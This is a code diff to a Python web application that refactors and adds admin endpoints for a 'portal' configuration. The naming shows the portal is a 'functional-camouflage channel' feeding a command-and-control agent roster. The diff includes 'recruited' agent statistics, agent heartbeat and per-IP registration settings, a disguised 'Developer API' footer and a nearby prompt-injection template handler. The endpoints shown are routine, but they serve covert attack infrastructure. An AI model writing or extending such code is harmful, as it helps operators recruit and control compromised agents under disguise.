@@ -6373,15 +6373,10 @@ def delete_prompt_injection_template(
     )
 
 
-@router.get("/admin/portal", response_class=HTMLResponse)
-def admin_portal_config(request: Request, db: Session = Depends(get_db)):
-    user = _require_user(request, db)
-    from app.services.portal_config import get_config_row
-
-    row = get_config_row(db)
+def _portal_funnel_stats(db: Session) -> dict:
+    """24h operational snapshot for the functional-camouflage channel."""
     from app.models.c2_agent import C2Agent
 
-    # operational snapshot: portal funnel + recruited roster
     day_ago = datetime.now(timezone.utc) - timedelta(hours=24)
     stats = {
         "fetches": int(
@@ -6429,6 +6424,16 @@ def admin_portal_config(request: Request, db: Session = Depends(get_db)):
             or 0
         ),
     }
+    return stats
+
+
+@router.get("/admin/portal", response_class=HTMLResponse)
+def admin_portal_config(request: Request, db: Session = Depends(get_db)):
+    user = _require_user(request, db)
+    from app.services.portal_config import get_config_row
+
+    row = get_config_row(db)
+    stats = _portal_funnel_stats(db)
     return _render(
         request,
         "admin/portal_config.html",
@@ -6439,6 +6444,67 @@ def admin_portal_config(request: Request, db: Session = Depends(get_db)):
             "saved": request.query_params.get("saved", ""),
             "user": user,
         },
+    )
+
+
+@router.get("/api/admin/portal/stats")
+def api_admin_portal_stats(request: Request, db: Session = Depends(get_db)):
+    _require_user(request, db)
+    return _portal_funnel_stats(db)
+
+
+@router.post("/api/admin/portal")
+async def api_admin_portal_save(request: Request, db: Session = Depends(get_db)):
+    """JSON save endpoint backing the AJAX form on /admin/portal."""
+    user = _require_admin(request, db)
+    from app.services.portal_config import save_config
+
+    try:
+        body = await request.json()
+    except Exception:
+        return JSONResponse({"error": "invalid_json"}, status_code=400)
+    try:
+        heartbeat_interval = int(body.get("heartbeat_interval", 30))
+        register_max = int(body.get("register_max_per_ip_hour", 20))
+    except (TypeError, ValueError):
+        return JSONResponse({"error": "invalid_number"}, status_code=400)
+    row = save_config(
+        db,
+        actor=user.username,
+        enabled=bool(body.get("enabled")),
+        footer_enabled=bool(body.get("footer_enabled")),
+        footer_title=str(body.get("footer_title") or "Developer API"),
+        heartbeat_interval=heartbeat_interval,
+        register_max_per_ip_hour=register_max,
+        notes=str(body.get("notes") or ""),
+    )
+    log_execution(
+        db,
+        actor_username=user.username,
+        action="update",
+        module="portal-config",
+        target_type="portal-config",
+        target_ref="portal",
+        detail_json={
+            "enabled": bool(row.enabled),
+            "footer_enabled": bool(row.footer_enabled),
+            "heartbeat_interval": row.heartbeat_interval,
+            "register_max_per_ip_hour": row.register_max_per_ip_hour,
+        },
+    )
+    return JSONResponse(
+        {
+            "status": "ok",
+            "config": {
+                "enabled": bool(row.enabled),
+                "footer_enabled": bool(row.footer_enabled),
+                "footer_title": row.footer_title,
+                "heartbeat_interval": row.heartbeat_interval,
+                "register_max_per_ip_hour": row.register_max_per_ip_hour,
+                "updated_by": row.updated_by,
+                "updated_at": row.updated_at.isoformat() if row.updated_at else None,
+            },
+        }
     )
 
 
